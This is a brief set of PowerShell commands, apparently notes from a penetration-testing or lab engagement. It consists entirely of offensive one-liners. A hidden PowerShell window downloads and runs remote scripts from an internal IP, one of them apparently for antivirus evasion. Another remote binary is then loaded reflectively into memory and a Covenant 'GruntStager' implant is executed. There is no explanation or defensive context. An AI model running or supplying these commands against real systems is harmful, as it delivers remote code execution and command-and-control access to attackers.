#powershell powershell -Sta -Nop -Window Hidden -c iex(new-object net.webclient).downloadstring('http://10.10.16.34/avee.ps1');iex(new-object net.webclient).downloadstring('http://10.10.16.34/stager.ps1')
$grunt = (new-object net.webclient).downloaddata("http://10.10.16.29/smb.exe")
[System.Reflection.Assembly]::Load($grunt)
[GruntStager.GruntStager]::Execute()
